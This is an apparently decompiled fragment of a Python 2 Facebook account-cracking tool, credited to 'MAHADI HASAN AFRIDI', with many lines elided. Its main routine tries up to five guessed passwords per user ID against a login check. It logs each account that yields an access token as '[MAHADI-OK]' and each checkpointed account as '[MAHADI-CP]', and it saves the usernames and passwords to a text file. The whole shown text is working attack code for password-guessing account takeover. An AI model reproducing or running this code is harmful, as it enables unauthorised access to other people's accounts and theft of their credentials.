# DECOMPILED BY MAHADI HASAN AFRIDI
# FACEBOOK : MAHADI HASAN AFRIDI
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[MAHADI-OK] ' + k + c + user + ' | ' + pass1
                okb = open('Without login.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[MAHADI-CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[MAHADI-OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Without login.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[MAHADI-CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Without login.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[MAHADI-OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Without login.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[MAHADI-CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Without login.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[MAHADI-OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Without login.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[MAHADI-CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Without login.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[MAHADI-OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Without login.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[MAHADI-CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Without login.txt', 'a')
